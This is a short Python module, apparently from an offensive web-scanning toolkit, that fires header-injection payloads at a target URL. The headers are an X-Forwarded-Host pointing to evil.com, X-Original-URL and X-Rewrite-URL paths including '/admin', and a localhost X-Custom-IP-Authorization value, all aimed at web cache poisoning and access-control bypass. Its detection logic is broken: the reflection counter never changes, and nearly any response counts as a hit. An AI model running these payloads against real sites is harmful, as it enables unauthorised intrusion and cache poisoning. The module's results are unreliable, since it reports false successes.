import requests

def run(target):
    payloads = [
        {"X-Forwarded-Host": "evil.com"},
        {"X-Original-URL": "/malicious"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"}
    ]

    reflections = 0
    hits = 0
    sent = 0
    for headers in payloads:
        try:
            r = requests.get(target, headers=headers, timeout=6)
            sent += 1
            if "evil" in r.text or "unauthorized" not in r.text:
                hits += 1
        except:
            continue

    return {
        "module": "fuzz_web_cache_poisoning",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Try poisoning edge caching"
    }
